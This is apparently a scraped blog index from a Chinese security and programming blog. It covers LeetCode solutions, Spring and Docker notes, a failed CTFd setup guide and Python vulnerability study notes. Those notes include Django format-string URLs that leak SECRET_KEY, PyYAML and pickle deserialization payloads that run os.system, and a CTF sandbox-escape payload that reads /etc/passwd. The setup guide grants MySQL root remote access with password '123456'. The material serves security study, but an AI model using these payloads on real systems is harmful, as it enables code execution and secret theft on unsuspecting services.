\"cf\"].说明:尽管上面的答案是按字典序排列的，但是你可以任意选择答案输出的顺序。 java 12345678910111213141516171819202122232425class Solution &#123; public List&lt;String&gt; letterCombinations(String digits) &#123; List&lt;String&gt; list=new ArrayList&lt;String&gt;(); if(digits.isEmpty()) &#123; return list; &#125; String[] mapping = new String[] &#123;\"0\", \"1\", \"abc\", \"def\", \"ghi\", \"jkl\", \"mno\", \"pqrs\", \"tuv\", \"wxyz\"&#125;; list.add(\"\"); String temp=null; int id=0; for(int i=0;i&lt;digits.length();i++) &#123; id=Integer.parseInt(digits.charAt(i)+\"\"); while(list.get(0).length()==i) &#123; temp=list.remove(0); for(int j=0;j&lt;mapping[id].length();j++) &#123; list.add(temp+mapping[id].charAt(j)); &#125; &#125; &#125; return list; &#125;&#125; python 123456789101112131415161718192021222324class Solution(object): def letterCombinations(self, digits): \"\"\" :type digits: str :rtype: List[str] \"\"\" dic = &#123;2: ['a', 'b', 'c'], 3: ['d', 'e', 'f'], 4: ['g', 'h', 'i'], 5: ['j', 'k', 'l'], 6: ['m', 'n', 'o'], 7: ['p', 'q', 'r', 's'], 8: ['t', 'u', 'v'], 9: ['w', 'x', 'y', 'z'], &#125; ret_str=[] if len(digits) == 0: return [] if len(digits) == 1: return dic[int(digits[0])] result=self.letterCombinations(digits[1:]) for r in result: for j in dic[int(digits[0])]: ret_str.append(j+r) return ret_str 0x18 四数之和给定一个包含 n 个整数的数组 nums 和一个目标值 target，判断 nums 中是否存在四个元素 a，b，c 和 d ，使得 a + b + c + d 的值与 target 相等？找出所有满足条件且不重复的四元组。 注意： 123456789101112答案中不可以包含重复的四元组。示例：给定数组 nums = [1, 0, -1, 0, -2, 2]，和 target = 0。满足要求的四元组集合为：[ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2]] 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution: def fourSum(self, nums: List[int], target: int) -&gt; List[List[int]]: n = len(nums) if n &lt; 4: return [] nums.sort() res = [] for i in range(n-3): # 防止重复 数组进入 res if i &gt; 0 and nums[i] == nums[i-1]: continue # 当数组最小值和都大于target 跳出 if nums[i] + nums[i+1] + nums[i+2] + nums[i+3] &gt; target: break # 当数组最大值和都小于target,说明i这个数还是太小,遍历下一个 if nums[i] + nums[n-1] + nums[n-2] + nums[n-3] &lt; target: continue for j in range(i+1,n-2): # 防止重复 数组进入 res if j - i &gt; 1 and nums[j] == nums[j-1]: continue # 同理 if nums[i] + nums[j] + nums[j+1] + nums[j+2] &gt; target: break # 同理 if nums[i] + nums[j] + nums[n-1] + nums[n-2] &lt; target: continue # 双指针 left = j + 1 right = n - 1 while left &lt; right: tmp = nums[i] + nums[j] + nums[left] + nums[right] if tmp == target: res.append([nums[i],nums[j],nums[left],nums[right]]) while left &lt; right and nums[left] == nums[left+1]: left += 1 while left &lt; right and nums[right] == nums[right-1]: right -= 1 left += 1 right -= 1 elif tmp &gt; target: right -= 1 else: left += 1 return res 数据库shell","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://blog.cfyqy.com/tags/leetcode/"}],"author":"ye1s"},{"title":"nodejs学习","slug":"odejs学习","date":"2019-05-20T14:20:00.000Z","updated":"2020-04-13T08:16:28.237Z","comments":true,"path":"article/c0cd5409.html","link":"","permalink":"https://blog.cfyqy.com/article/c0cd5409.html","excerpt":"","text":"概念 npm 模块 EventEmitter Stream(流) Buffer(缓冲区) 全局对象 express中间件 工具模块 文件系统 多进程","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://blog.cfyqy.com/tags/nodejs/"}],"author":"ye1s"},{"title":"python中常见的漏洞","slug":"thon中常见的漏洞","date":"2019-05-18T02:06:00.000Z","updated":"2020-04-13T08:20:41.635Z","comments":true,"path":"article/e10ad94a.html","link":"","permalink":"https://blog.cfyqy.com/article/e10ad94a.html","excerpt":"比较少接触python的网站，要多花点时间来学习一下。","text":"比较少接触python的网站，要多花点时间来学习一下。 format注入详细可看:http://www.venenof.com/index.php/archives/360/flask为例 123456789101112131415from flask import Flask, requestapp = Flask(__name__)class veneno(): ven='hacker' def __init__(self,name=None): bb=veneno.ven self.name=veneno.ven return bb@app.route('/test/',methods=['POST'])def ven(): test = request.form['test'] return 'OK===&gt;'+test.format(veneno)if __name__ == '__main__': app.run(host='0.0.0.0', debug=True) 在{0.xxx}.format(xxx)时，0是会被替代为format里的参数的,在python中，init是在类中被用做构造函数，而globals则是全局变量，于是就可以去继承类的中的方法，以此类推django为例:详情可看:https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django0x1 利用格式化字符串漏洞泄露Django配置信息 123def view(request, *args, **kwargs): template = 'Hello &#123;user&#125;, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件。所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。 我随便列出两个，还有几个更有意思的我暂时不说： 123http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; 参考文章:LDAP注入(http://www.cnblogs.com/r00tgrok/p/LDAP_INJECTION_AND_PREVENTION.html)format注入(http://www.venenof.com/index.php/archives/360/)Python urllib HTTP头注入漏洞(https://www.tuicool.com/articles/2iIj2eR)","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"漏洞","slug":"漏洞","permalink":"https://blog.cfyqy.com/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"ye1s"},{"title":"python ssti漏洞","slug":"python-ssti漏洞","date":"2019-05-18T02:02:00.000Z","updated":"2020-04-13T08:17:23.859Z","comments":true,"path":"article/8a9b06ae.html","link":"","permalink":"https://blog.cfyqy.com/article/8a9b06ae.html","excerpt":"SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的","text":"SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的 详情可看以下几篇文章:浅析SSTI(python沙盒绕过)[Flask/jinja2与SSTI「服务端模版注入攻击]](https://drops.org.cn/Python/flask-jinja2-ssti.html) 参考文章:浅析SSTI(python沙盒绕过(https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8)Flask/jinja2与SSTI「服务端模版注入攻击](https://drops.org.cn/Python/flask-jinja2-ssti.html)","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"SSTI","slug":"SSTI","permalink":"https://blog.cfyqy.com/tags/SSTI/"}],"author":"ye1s"},{"title":"python命令代码执行漏洞","slug":"thon漏洞审计","date":"2019-05-15T13:37:17.000Z","updated":"2020-04-13T08:21:54.184Z","comments":true,"path":"article/870e95a.html","link":"","permalink":"https://blog.cfyqy.com/article/870e95a.html","excerpt":"python中常见的命令代码执行漏洞的利用方式","text":"python中常见的命令代码执行漏洞的利用方式 yaml详情可看http://www.polaris-lab.com/index.php/archives/375/利用sample.yml以下其中的一行 12345678!!python/object/apply:os.system [\"calc.exe\"]!!python/object/new:os.system [\"calc.exe\"]!!python/object/apply:subprocess.check_output [[calc.exe]]!!python/object/apply:subprocess.check_output [\"calc.exe\"]!!python/object/apply:subprocess.check_output [[\"calc.exe\"]]!!python/object/apply:os.system [\"calc.exe\"]!!python/object/new:subprocess.check_output [[\"calc.exe\"]]!!python/object/new:os.system [\"calc.exe\"] yaml_verify.py 12import yamlyaml.load(file('simple.yml', 'r')) 沙箱逃匿沙箱逃逸,就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程总体来说,我们使用以下几个函数,就可以直接愉快的拿到shell啦! 12345678910import osimport subprocessimport commands# 直接输入shell命令,以ifconfig举例os.system('ifconfig')os.popen('ifconfig')commands.getoutput('ifconfig')commands.getstatusoutput('ifconfig')subprocess.call(['ifconfig'],shell=True) Magic Code在Python里，这段[].class.base.subclasses()魔术代码，不用import任何模块，但可调用任意模块的方法。在2.7.10里，有以下3个Class导入了os模块。 123&lt;class 'site._Printer'&gt;&lt;class 'site.Quitter'&gt;&lt;class 'subprocess.Popen'&gt; 命令执行代码 1234567def cmdexec(cmd): magic = [].__class__.__base__.__subclasses__() for item in magic: if \"&lt;class 'site._Printer'&gt;\" == str(item): ret = item.__init__.__globals__['os'].system(cmd) return retprint cmdexec('whoami') 以2014 CSAW-CTF为例例题 12345678910111213141516171819202122232425262728293031323334353637#print \"os\".encode('rot13')from __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys()targets.remove('raw_input')targets.remove('print')for x in targets: del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"[-] \" + no) break else: # this means nobreak exec data 解答 123456➜ python_sandbox_bypass python sandbox.pyWelcome to my Python sandbox! Enter commands below!&gt;&gt;&gt; s = 's' + 'ystem'&gt;&gt;&gt; a = [].__class__.__base__.__subclasses__()[68].__init__.__globals__['o'+'s'].__dict__[s]&gt;&gt;&gt; a('cat /etc/passwd')nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false pickle详情可看此文章其中的第一种利用方法pickle允许任意对象去定义一个reduce方法来申明怎么序列化这个对象。这个方法返回一个字符串或者元组来描述当反序列化的时候该如何重构。生成payload的代码pickle_poc_gen.py 12345678910111213141516import cPickleimport osimport urllibclass genpoc(object): def __reduce__(self): s = \"\"\"ipconfig\"\"\" #要执行的命令 return os.system, (s,) #os.system(\"echo test &gt;poc.txt\")e = genpoc()poc = cPickle.dumps(e)print pocprint urllib.quote(poc)fp = open(\"poc.pickle\",\"w\")fp.write(poc) dopickle.py 12import picklepickle.load(open('./poc.pickle')) 现在问题来了，如何在实际的web环境中使用这些payload呢？我们先实现一个简单的httpserver pickle_verify_httpserver.py 123456789101112131415161718192021222324252627282930313233import BaseHTTPServerimport urllibimport cPickleclass ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler): def do_GET(self): if \"?payload\" in self.path: query= urllib.splitquery(self.path) action = query[1].split('=')[1] print action action = urllib.unquote(action) print action try: x = cPickle.loads(action) #string argv print x content = \"command executed\" except Exception,e: print e content = e else: content = \"hello World\" self.send_response(200) self.send_header(\"Content-type\",\"text/html\") self.end_headers() self.wfile.write(\"&lt;html&gt;\") self.wfile.write(\" %s \" % content) self.wfile.write(\"&lt;/html&gt;\")if __name__ == '__main__': srvr = BaseHTTPServer.HTTPServer(('',8000), ServerHandler) print 'started httpserver...' srvr.serve_forever() 运行以上代码后，将运行一个监听本地8000端口的web服务器，通过如下URL访问，传递Payload给服务器。url访问 http://127.0.0.1:8000/?payload=cnt%0Asystem%0Ap1%0A%28S%27ipconfig%27%0Ap2%0AtRp3%0A. 参考文章:Python PyYAML反序列化漏洞实验和Payload构造(http://www.polaris-lab.com/index.php/archives/375/)format注入(http://www.venenof.com/index.php/archives/360/)Python urllib HTTP头注入漏洞(https://www.tuicool.com/articles/2iIj2eR)Hack Redis via Python urllib HTTP Header Injection(https://security.tencent.com/index.php/blog/msg/106)Python沙箱逃逸的n种姿势(https://xz.aliyun.com/t/52/#toc-0)Python Sandbox Bypass(https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483665&amp;idx=1&amp;sn=4b18de09738fdc5291634db1ca2dd55a)Python Pickle的任意代码执行漏洞实践和Payload构造(http://www.polaris-lab.com/index.php/archives/178/)","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"命令代码执行","slug":"命令代码执行","permalink":"https://blog.cfyqy.com/tags/%E5%91%BD%E4%BB%A4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"}],"author":"ye1s"},{"title":"springboot学习","slug":"ringboot","date":"2019-05-14T07:04:54.000Z","updated":"2020-04-13T08:19:46.268Z","comments":true,"path":"article/8049be4c.html","link":"","permalink":"https://blog.cfyqy.com/article/8049be4c.html","excerpt":"Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。","text":"Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。 详情看此文章:适合初学者:https://blog.lqdev.cn/2018/07/11/springboot/chapter-zero/适合进阶者:http://www.ityouknow.com/spring-boot.html 概述 配置详解 常用注释 过滤监听拦截器 日志配置 异常处理","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.cfyqy.com/tags/springboot/"}],"author":"ye1s"},{"title":"centos7搭建ctfd平台","slug":"ntos7搭建ctfd平台","date":"2019-04-30T15:44:00.000Z","updated":"2019-05-11T06:22:34.888Z","comments":true,"path":"article/9585d64f.html","link":"","permalink":"https://blog.cfyqy.com/article/9585d64f.html","excerpt":"失败的一次搭建","text":"失败的一次搭建 搭建环境 123CentOS Linux release 7.6.1810 (Core) Apache/2.4.6 (CentOS)mysql 5.7.2.6 0x1mysql安装0x1.1下载并安装MySQL官方的 Yum Repository 1wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm 0x1.2yum安装 1yum -y install mysql57-community-release-el7-10.noarch.rpm 0x1.3安装MySQL服务器 1yum -y install mysql-community-server 0x1.4启动MySQL 1systemctl start mysqld.service 0x1.5查看MySQL运行状态 1systemctl status mysqld.service 0x1.6查看mysql的默认密码为了加强安全性，MySQL5.7为root用户随机生成了一个密码，如果安装的是RPM包，则默认是在/var/log/mysqld.log中 1grep 'temporary password' /var/log/mysqld.log 0x1.7修改密码查看密码设置要求 1SHOW VARIABLES LIKE 'validate_password%'; 仅仅为了测试，密码不用太复杂，修改密码前,先把密码设置要求，给取消。 1set global validate_password_policy=0; 修改密码 123SET PASSWORD = PASSWORD('your new password');ALTER USER 'root'@'localhost' PASSWORD EXPIRE NEVER;flush privileges; 0x1.8修改mysql编码在/etc/my.cnf中mysqld添加修改配置文件的内容，在[mysqld]结束位置添加 1character_set_server = utf8 重启mysql 1systemctl restart mysqld.service 进入mysql,查看修改的编码结果 1show variables like 'character_set_%'; 允许root远程登录 12grant all privileges on *.* to 'root'@'%' identified by '123456' with grant option;flush privileges; 0x2安装apache0x2.1安装ApacheApache在默认的CentOS仓库中可用，安装非常简单。 在CentOS和RHEL上，Apache软件包和服务称为httpd。 要安装软件包，请运行以下命令 1sudo yum install httpd 0x2.2启动服务 12sudo systemctl enable httpdsudo systemctl start httpd 0x2.3检查Apache服务的状态和版本 12sudo systemctl status httpd httpd -v 0x3 ctfd搭建0x3.1下载ctfd 1git clone https://github.com/isislab/CTFd.git 0x3.2修改并运行 prepare.sh将apt-get修改为yum 123sudo yum -y updatesudo yum install build-essential python-dev python-pip libffi-dev -ypip install -r requirements.txt 运行 1./prepare.sh 0x3.3修改数据库依赖在mysql中创建ctfd数据库 1create database ctfd; 在CTFd/config.py中，默认依赖sqlite,修改成mysql 12#DATABASE_URL = os.getenv('DATABASE_URL') or 'sqlite:///&#123;&#125;/ctfd.db'.format(os.path.dirname(os.path.abspath(__file__)))DATABASE_URL = 'mysql+pymysql://数据库用户:密码@localhost:3306/ctfd' 0x3.4安装配置mod_wsgi首先安装httpd-devel 1yum install -y httpd-devel 安装mod__wsgi 1yum install mod_wsgi 0x3.5修改wsgi.py 1234from CTFd import create_appimport syssys.path.insert(0, '/var/www/html/CTFd/')application = create_app() 0x3.6创建www用户 1chown -R www:www CTFd/ 0x3.7 创建新站点文件在/etc/httpd/conf.d/中创建ctfd.conf,内容如下: 1234567891011121314&lt;VirtualHost *:80&gt; WSGIDaemonProcess CTFd user=www group=www threads=5 WSGIScriptAlias / /var/www/html/CTFd/wsgi.py &lt;Directory /var/www/html/CTFd&gt; WSGIProcessGroup CTFd WSGIApplicationGroup %&#123;GLOBAL&#125; Order deny,allow AllowOverride All #Require all granted Allow from all &lt;/Directory&gt;&lt;/VirtualHost&gt; 还是安装失败……附上截图，以后再探究 0x4安装nginx0x4.1、添加源默认情况Centos7中无Nginx的源，最近发现Nginx官网提供了Centos的源地址。因此可以如下执行命令添加源： 1sudo rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm 0x4.2、安装Nginx通过yum search nginx看看是否已经添加源成功。如果成功则执行下列命令安装Nginx。 1sudo yum install -y nginx 0x4.3、启动Nginx并设置开机自动运行 12sudo systemctl start nginx.servicesudo systemctl enable nginx.service 遇到问题有点多。以后再慢慢整参考文章:mysql安装 https://www.cnblogs.com/luohanguo/p/9045391.htmlapache安装 https://www.linuxidc.com/Linux/2018-05/152261.htmctfd平台搭建 http://www.ifuryst.com/archives/CTFd.htmlCentos7使用Apache+mod_wsgi部署flask网站https://blog.csdn.net/qq_36962569/article/details/80885396centos7安装Nginxhttps://www.cnblogs.com/kaid/p/7640723.html","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/tags/%E5%85%B6%E4%BB%96/"}],"author":"ye1s"},{"title":"邮件发送的几种方式","slug":"邮件发送的几种方式","date":"2019-04-30T12:49:00.000Z","updated":"2020-04-13T08:32:26.347Z","comments":true,"path":"article/4d599224.html","link":"","permalink":"https://blog.cfyqy.com/article/4d599224.html","excerpt":"做做笔记","text":"做做笔记 0x1调用第三方邮件服务0x1.2 mailgun 12345678910import requestsdef send_simple_message(): return requests.post( \"https://api.mailgun.net/v3/yourdomain/messages\", auth=(\"api\", \"yourapi\"), data=&#123;\"from\": \"JMCTF Admin &lt;mailgun@yourdomain&gt;\", \"to\": [\"test@qq.com\"], \"subject\": \"Hello\", \"text\": \"Testing some Mailgun awesomness!\"&#125;)send_simple_message() 0x1.2 qq 12345678910111213141516171819202122232425262728import requestsimport smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.text import MIMETextfrom email.mime.image import MIMEImagefrom email.header import Headerdef get_smtp(host, port, username, password): smtp = smtplib.SMTP_SSL(host, port) smtp.ehlo() smtp.login(username, password) return smtpdef sendmail(): data = &#123; 'host': \"smtp.qq.com\", 'port': 465 &#125; data['username'] = \"from@qq.com\" data['password'] = \"*************\" smtp = get_smtp(**data) msg = MIMEText('Python 邮件发送测试...', 'plain', 'utf-8') msg['Subject'] = \"Message from &#123;0&#125;\".format(\"ctf_name\") msg['From'] = 'from@qq.com' msg['To'] = 'to@qq.com' smtp.sendmail(msg['From'], [msg['To']], msg.as_string()) smtp.quit() print \"Email sent\"sendmail() 0x2 semdmail1echo \"This is test mail\" | sendmail -s 'Test mail' test@qq.com","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/tags/%E5%85%B6%E4%BB%96/"}],"author":"ye1s"},{"title":"maven学习","slug":"aven学习","date":"2019-04-25T07:36:00.000Z","updated":"2020-04-13T08:12:25.784Z","comments":true,"path":"article/e5dd7f0f.html","link":"","permalink":"https://blog.cfyqy.com/article/e5dd7f0f.html","excerpt":"Maven项目对象模型(POM)，可以通过一小段描述信息来管理项目的构建，报告和文档的项目管理工具软件。","text":"Maven项目对象模型(POM)，可以通过一小段描述信息来管理项目的构建，报告和文档的项目管理工具软件。 pom 生命周期 配置文件 仓库 插件","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"maven","slug":"maven","permalink":"https://blog.cfyqy.com/tags/maven/"}],"author":"ye1s"},{"title":"mybatis学习","slug":"mybatis学习-1","date":"2019-04-22T13:43:00.000Z","updated":"2020-04-13T08:15:45.965Z","comments":true,"path":"article/9dbabd25.html","link":"","permalink":"https://blog.cfyqy.com/article/9dbabd25.html","excerpt":"MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。","text":"MyBatis 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以使用简单的 XML 或注解来配置和映射原生类型、接口和 Java 的 POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。 思维导图来源:https://gitee.com/java-mindmap/mapSource mybatis简介 与hibernate对比 几个关键类 mybatis执行浅析 MyBatis框架整体设计 mybatis初始化与执行sql过程 mybatis源码的几个主要部件 XML 映射配置文件（一） XML 映射配置文件（二） XML 映射配置文件（三） mybatis的优缺点 与spring整合 mapper的xml文件（一） mapper的xml文件（二） mapper的xml文件（三） mapper的xml文件（四） resultMap子元素 元素集合collection mapper的xml文件（五） 动态 SQL","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"mybtis","slug":"mybtis","permalink":"https://blog.cfyqy.com/tags/mybtis/"}],"author":"ye1s"},{"title":"spring mvc学习","slug":"spring-mvc学习","date":"2019-04-20T14:15:00.000Z","updated":"2020-04-13T08:20:18.165Z","comments":true,"path":"article/ffb6ff07.html","link":"","permalink":"https://blog.cfyqy.com/article/ffb6ff07.html","excerpt":"Spring MVC是Spring提供的一个实现Web MVC设计模式的轻量级Web框架","text":"Spring MVC是Spring提供的一个实现Web MVC设计模式的轻量级Web框架 导图来源: https://www.jianshu.com/p/7c4bbf1ba998 概述 注释 DispatcherServlet.png web.xml加载过程 web.xml配置 配置文件标签 特殊bean 异常处理方式","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"java","slug":"java","permalink":"https://blog.cfyqy.com/tags/java/"},{"name":"spring mvc","slug":"spring-mvc","permalink":"https://blog.cfyqy.com/tags/spring-mvc/"}],"author":"ye1s"},{"title":"spring学习","slug":"pring框架","date":"2019-04-19T07:14:30.000Z","updated":"2020-04-13T08:17:13.885Z","comments":true,"path":"article/7ae8df41.html","link":"","permalink":"https://blog.cfyqy.com/article/7ae8df41.html","excerpt":"Spring框架是由于软件开发的复杂性而创建的。Spring使用的是基本的JavaBean来完成以前只可能由EJB完成的事情。然而，Spring的用途不仅仅限于服务器端的开发。从简单性、可测试性和松耦合性角度而言，绝大部分Java应用都可以从Spring中受益","text":"Spring框架是由于软件开发的复杂性而创建的。Spring使用的是基本的JavaBean来完成以前只可能由EJB完成的事情。然而，Spring的用途不仅仅限于服务器端的开发。从简单性、可测试性和松耦合性角度而言，绝大部分Java应用都可以从Spring中受益 思维导图来源大部分来源:https://gitee.com/java-mindmap/mapSource spring基础特征 jar包 常用模块 sprng iocico BeanFactory与ApplacationContext ico容器 Bean 依赖注入 基于注解的配置 aop 概念 重要概念 日志处理参考文章:spring教程https://www.w3cschool.cn/wkspring/","categories":[{"name":"开发","slug":"开发","permalink":"https://blog.cfyqy.com/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"spring","slug":"spring","permalink":"https://blog.cfyqy.com/tags/spring/"}],"author":"ye1s"},{"title":"物联网复习","slug":"联网复习","date":"2019-04-18T12:13:00.000Z","updated":"2019-04-19T07:13:46.803Z","comments":true,"path":"article/2453bef.html","link":"","permalink":"https://blog.cfyqy.com/article/2453bef.html","excerpt":"复习考完后吐槽:真水","text":"复习考完后吐槽:真水","categories":[{"name":"其他","slug":"其他","permalink":"https://blog.cfyqy.com/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"iot","slug":"iot","permalink":"https://blog.cfyqy.com/tags/iot/"}],"author":"ye1s"},{"title":"java GUI编程","slug":"ava-gui编程","date":"2019-04-15T13:36:00.000Z","updated":"2020-04-13T08:12:11.905Z","comments":true,"path":"article/7d9ce106.html","link":"","permalink":"https://blog.cfyqy.com/article/7d9ce106.html","excerpt":"java GUI","text":"java GUI","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"java gui","slug":"java-gui","permalink":"https://blog.cfyqy.com/tags/java-gui/"}],"author":"ye1s"},{"title":"docker学习","slug":"cker学习","date":"2019-04-15T06:01:00.000Z","updated":"2020-08-30T15:01:07.055Z","comments":true,"path":"article/7fb3659b.html","link":"","permalink":"https://blog.cfyqy.com/article/7fb3659b.html","excerpt":"Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口","text":"Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口 Docker从入门到实践 将搭建好的容器发布到hub首先在https://hub.docker.com/ 中创建一个repository 创建好后，命令行下输入如下命令登录，依次输入用户名密码 1docker login 登录完后，把所需上传的容器变为镜像 12docker ps #查看运行的容器docker commit containerId dockerUserName/XXX 注：containerId为你需要上传的容器id，dockerUserName为dockerHub的登录名，xxx为仓库名,当然也不一定非得是dockerUserName/xxx，只是为了方便起见 接下来为存在于本地的镜像打标签 12docker images #查看本地镜像docker tag imageName dockerUserName/xxx[:tag] 注：imageName为你需要上传的镜像name，dockerUserName为dockerHub的登录名，xxx为仓库名，必须和你在dockerhub中新建的仓库名相同，tag不指定就是latest 打包好之后，就把打包好的镜像上传 1docker push dockerUserName/xxx[:tag] 注：tag不指定就是latest 最后就去dockerhub上查看是否上传成功 运行docker容器创建镜像 1docker pull centos #没有指定tag,默认是latest 启动容器，并映射端口 1sudo docker run -t -i -p 60000(本地):8000(容器) ye1s/ye1s:IPSearch /bin/bash 退出容器 12exit 退出并停止运行容器 ctrl+p+q 退出但没有停止运行容器 进入在运行的容器 1docker attach 如果上面没有指定/bin/bash 1docker exec -it myredis-master-6379 /bin/bash 镜像下载慢1cd /etc/docker 开daemon.json，内容配置如下： 使用阿里镜像加速https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors 123&#123; \"registry-mirrors\": [\"https://rs2cno6m.mirror.aliyuncs.com\"]&#125; 重新加载文件和重启docker 12systemctl daemon-reload //重新加载systemctl restart docker //重启 批量删除镜像/容器12sudo docker rmi `sudo docker images -q` sudo docker rm `sudo docker ps -a -q` DockerfileDockerfile包含创建镜像所需要的全部指令。基于在Dockerfile中的指令，我们可以使用Docker build命令来创建镜像。通过减少镜像和容器的创建过程来简化部署。所有Dockerfile都必须以FROM命令开始。 FROM命令会指定镜像基于哪个基础镜像创建，接下来的命令也会基于这个基础镜像（译者注：CentOS和Ubuntu有些命令可是不一样的）。FROM命令可以多次使用，表示会创建多个镜像。具体语法如下： 1FROM &lt;image name&gt; Dockerfile命令 MAINTAINER：设置该镜像的作者。语法如下：1MAINTAINER &lt;author name&gt; RUN：在shell或者exec的环境下执行的命令。RUN指令会在新创建的镜像上添加新的层面，接下来提交的结果用在Dockerfile的下一条指令中。语法如下：1RUN 《command》 ADD：复制文件指令。它有两个参数和。destination是容器内的路径。source可以是URL或者是启动配置上下文中的一个文件。语法如下：1ADD 《src》 《destination》 CMD：提供了容器默认的执行命令。 Dockerfile只允许使用一次CMD指令。 使用多个CMD会抵消之前所有的指令，只有最后一个指令生效。 CMD有三种形式：123CMD [\"executable\",\"param1\",\"param2\"]CMD [\"param1\",\"param2\"]CMD command param1 param2 EXPOSE：指定容器在运行时监听的端口。语法如下：1EXPOSE &lt;port&gt;; ENTRYPOINT：配置给容器一个可执行的命令，这意味着在每次使用镜像创建容器时一个特定的应用程序可以被设置为默认程序。同时也意味着该镜像每次被调用时仅能运行指定的应用。类似于CMD，Docker只允许一个ENTRYPOINT，多个ENTRYPOINT会抵消之前所有的指令，只执行最后的ENTRYPOINT指令。语法如下：12ENTRYPOINT [\"executable\", \"param1\",\"param2\"]ENTRYPOINT command param1 param2 WORKDIR：指定RUN、CMD与ENTRYPOINT命令的工作目录。语法如下：1WORKDIR /path/to/workdir ENV：设置环境变量。它们使用键值对，增加运行程序的灵活性。语法如下：1ENV &lt;key&gt; 